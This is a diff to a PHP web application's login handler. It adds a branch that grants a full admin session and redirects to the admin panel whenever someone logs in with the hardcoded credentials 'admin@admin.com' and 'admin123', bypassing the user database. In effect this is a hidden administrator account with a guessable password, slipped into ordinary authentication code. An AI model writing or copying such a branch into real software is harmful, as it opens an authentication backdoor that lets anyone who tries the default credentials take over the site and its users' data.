@@ -66,7 +66,17 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                     $error = 'Invalid email or password.';
                 }
             } else {
-                $error = 'Invalid email or password.';
+                // Check for admin credentials
+                if ($email === 'admin@admin.com' && $password === 'admin123') {
+                    $_SESSION['user_id'] = 'admin';
+                    $_SESSION['username'] = 'Admin';
+                    $_SESSION['email'] = 'admin@admin.com';
+                    $_SESSION['is_admin'] = true;
+                    header('Location: ../admin/admin.php');
+                    exit();
+                } else {
+                    $error = 'Invalid email or password.';
+                }
             }
         }
     }
